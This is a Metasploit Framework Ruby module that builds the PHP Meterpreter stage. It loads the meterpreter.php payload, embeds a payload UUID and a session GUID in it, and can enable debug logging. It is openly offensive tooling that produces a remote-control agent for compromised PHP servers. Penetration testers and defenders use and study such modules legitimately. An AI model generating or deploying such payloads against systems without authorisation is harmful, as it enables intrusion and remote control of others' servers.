##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'

module MetasploitModule

  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter',
      'Description'   => 'Run a meterpreter server in PHP',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate_stage(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    uuid = opts[:uuid] || generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")

    # Staged payloads need to have a new session GUID
    session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*').chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)

    if datastore['MeterpreterDebugBuild']
      met.sub!(%q|define("MY_DEBUGGING", false);|, %Q|define("MY_DEBUGGING", true);|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
      met.sub!(%q|define("MY_DEBUGGING_LOG_FILE_PATH", false);|, %Q|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
    end

    met.gsub!(/#.*?$/, '')
    #met = Rex::Text.compress(met)
    met
  end
end
